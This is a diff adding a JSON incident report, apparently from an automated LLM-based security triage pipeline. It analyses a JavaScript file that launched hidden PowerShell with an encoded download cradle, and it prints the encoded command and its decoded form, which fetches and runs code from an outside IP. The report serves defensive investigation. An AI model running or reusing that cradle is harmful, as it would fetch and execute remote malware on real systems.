@@ -1,0 +1,208 @@
+{
+  "report_id": "fbd9ad5e-bf77-46a8-8107-a10c48efb65f",
+  "alert_id": "24898897-d412-53fe-a2a8-5073ee119e11",
+  "generated_at": "2026-08-14T23:01:53.402750Z",
+  "alert_summary": "A JavaScript file located in the Downloads folder of user ke.li.yam executed via wscript.exe spawned a hidden PowerShell process running an encoded download cradle to fetch and execute remote content from IP 45.146.164.110.",
+  "investigation_timeline": [
+    {
+      "step_name": "ingest_and_parse",
+      "action": "completed",
+      "tool_used": null,
+      "input": null,
+      "output_summary": "alert 24898897-d412-53fe-a2a8-5073ee119e11 ingested; model available: True",
+      "timestamp": "2026-08-14T22:47:44.920999Z"
+    },
+    {
+      "step_name": "extract_indicators",
+      "action": "completed",
+      "tool_used": "regex_extraction+llm_extraction",
+      "input": null,
+      "output_summary": "regex: 15 candidates, 6 validated; command decode: 1 segment(s) decoded, 0 discarded; LLM: 3 candidates, 3 validated",
+      "timestamp": "2026-08-14T22:50:20.763111Z"
+    },
+    {
+      "step_name": "enrich",
+      "action": "completed",
+      "tool_used": "enrichment_registry",
+      "input": null,
+      "output_summary": "enriched 7 indicator(s)",
+      "timestamp": "2026-08-14T22:50:20.763152Z"
+    },
+    {
+      "step_name": "gather_context",
+      "action": "completed",
+      "tool_used": "siem_connector",
+      "input": null,
+      "output_summary": "gathered context for agent 000, rule 100075",
+      "timestamp": "2026-08-14T22:50:21.182426Z"
+    },
+    {
+      "step_name": "correlate",
+      "action": "completed",
+      "tool_used": "siem_connector+llm",
+      "input": null,
+      "output_summary": "pattern_type=other, evidence_count=55; follow-up same_rule_id_host added 27; open-value search for '-EncodedCommand' found 26 (noisier, unstructured match)",
+      "timestamp": "2026-08-14T22:53:06.362704Z"
+    },
+    {
+      "step_name": "risk_assessment",
+      "action": "completed",
+      "tool_used": "llm",
+      "input": null,
+      "output_summary": "severity=high, confidence=high",
+      "timestamp": "2026-08-14T22:54:17.071975Z"
+    },
+    {
+      "step_name": "draft_report",
+      "action": "completed",
+      "tool_used": "llm",
+      "input": null,
+      "output_summary": "draft-A: 13 action(s) selected; draft-B: experimental triage=true_positive",
+      "timestamp": "2026-08-14T22:58:25.543512Z"
+    },
+    {
+      "step_name": "self_check",
+      "action": "completed",
+      "tool_used": "llm",
+      "input": null,
+      "output_summary": "audited 15 claim(s), 0 flagged",
+      "timestamp": "2026-08-14T23:01:53.402650Z"
+    },
+    {
+      "step_name": "finalize_and_persist",
+      "action": "completed",
+      "tool_used": "alert_store",
+      "input": null,
+      "output_summary": "report fbd9ad5e-bf77-46a8-8107-a10c48efb65f persisted, alert marked investigated",
+      "timestamp": "2026-08-14T23:01:53.412121Z"
+    }
+  ],
+  "enrichment_findings": [
+    {
+      "indicator_type": "domain",
+      "indicator_value": "dev-klyam01.victimcorp.com",
+      "provider_id": "none",
+      "queried_at": "2026-08-14T22:50:20.763129Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-14T22:50:20.763129Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "ke.li.yam",
+      "provider_id": "none",
+      "queried_at": "2026-08-14T22:50:20.763141Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-14T22:50:20.763141Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "build-helper.js",
+      "provider_id": "none",
+      "queried_at": "2026-08-14T22:50:20.763144Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-14T22:50:20.763144Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "url",
+      "indicator_value": "http://45.146.164.110:8080/u",
+      "provider_id": "none",
+      "queried_at": "2026-08-14T22:50:20.763146Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-14T22:50:20.763146Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "ip",
+      "indicator_value": "45.146.164.110",
+      "provider_id": "none",
+      "queried_at": "2026-08-14T22:50:20.763147Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-14T22:50:20.763147Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "net.webclient",
+      "provider_id": "none",
+      "queried_at": "2026-08-14T22:50:20.763149Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-14T22:50:20.763149Z",
+      "error": "no_provider_registered"
+    },
+    {
+      "indicator_type": "domain",
+      "indicator_value": "victimcorp.com",
+      "provider_id": "none",
+      "queried_at": "2026-08-14T22:50:20.763150Z",
+      "verdict": "unknown",
+      "score": 0.0,
+      "raw_response": {},
+      "cache_expires_at": "2026-08-14T22:50:20.763150Z",
+      "error": "no_provider_registered"
+    }
+  ],
+  "risk_assessment": {
+    "severity": "high",
+    "confidence": "high",
+    "rationale": "The decoded PowerShell command reveals a classic download cradle using IEX and Net.WebClient.DownloadString to retrieve and execute code from an external server, which is a hallmark of malware staging or post-exploitation activity. The use of base64 encoding (-Enc) combined with hidden execution flags (-NoP -W Hidden) demonstrates deliberate obfuscation intended to evade detection and user awareness. Furthermore, the execution chain originating from a JavaScript file in the user's Downloads folder via wscript.exe suggests a likely initial compromise vector such as a malicious document or drive-by download, warranting immediate containment and investigation."
+  },
+  "recommended_actions": [
+    "Disable or reset credentials for the affected user account",
+    "Block the source IP at the network perimeter",
+    "Isolate the affected host from the network pending investigation",
+    "Escalate to the incident response / Tier 2 team",
+    "Review authentication logs for this account over a wider time window",
+    "Run an antivirus/EDR scan on the affected host",
+    "Review file integrity monitoring output for unauthorized changes on the affected host",
+    "Notify the asset owner of the affected host or agent",
+    "Rotate any credentials or secrets that may have been exposed",
+    "Correlate this indicator against the wider environment beyond this alert's time window",
+    "Preserve logs and evidence for the affected host pending further investigation",
+    "Terminate the suspicious process on the affected host",
+    "Review the parent-child process execution tree for the affected host"
+  ],
+  "recommended_actions_freeform_experimental": [
+    "Immediately isolate host dev-klyam01.victimcorp.com from the network to prevent further C2 communication, data exfiltration, or lateral movement.",
+    "Preserve and forensically analyze C:\\Users\\ke.li.yam\\Downloads\\build-helper.js: capture file hashes, perform static analysis for obfuscation or packed routines, and check against known malware signatures or JS-based loaders.",
+    "Reconstruct the full process tree around the PowerShell invocation; inspect child processes, injected modules, and any persistence artifacts (registry run keys, scheduled tasks, WMI subscriptions, or service installations).",
+    "Collect and review PowerShell Script Block Logging, AMSI telemetry, and Sysmon Event IDs 1, 3, 6, and 10 to map the execution chain, identify dropped binaries, and capture outbound network sessions.",
+    "Investigate proxy, firewall, and DNS logs for connections to 45.146.164.110:8080; manually enrich the IP via external threat intelligence feeds, WHOIS, and historical sighting databases to determine infrastructure attribution.",
+    "Review user ke.li.yam's recent email attachments, browser history, and file transfer activity to pinpoint the initial delivery mechanism that placed build-helper.js in the Downloads directory.",
+    "Deploy environment-wide hunting queries targeting wscript.exe spawning PowerShell with -Enc, base64-encoded download cradles, or internal hosts initiating HTTP traffic to untrusted IPs on non-standard ports."
+  ],
+  "triage_verdict_experimental": "true_positive",
+  "triage_rationale_experimental": "The alert exhibits a textbook malware delivery pattern: a JavaScript file in the Downloads folder launches a hidden, profile-less PowerShell process that executes a base64-encoded download cradle to fetch and run remote content from an untrusted IP, which strongly aligns with active initial access or post-exploitation tooling.",
+  "uncertainty_notes": "7 enrichment lookup(s) errored or returned unknown verdicts",
+  "status": "complete",
+  "model_metadata": {
+    "model_name": "qwen3.6:27b-bench-ctx8k",
+    "model_version": "none",
+    "prompt_version": "4d-v1"
+  },
+  "command_analysis": {
+    "command_line": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==",
+    "parent_command_line": "\"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ke.li.yam\\Downloads\\build-helper.js\"",
+    "decoded_segments": [
+      {
+        "encoding": "powershell_encoded",
+        "original": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==",
+        "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')"
+      }
+    ]
+  }
+}
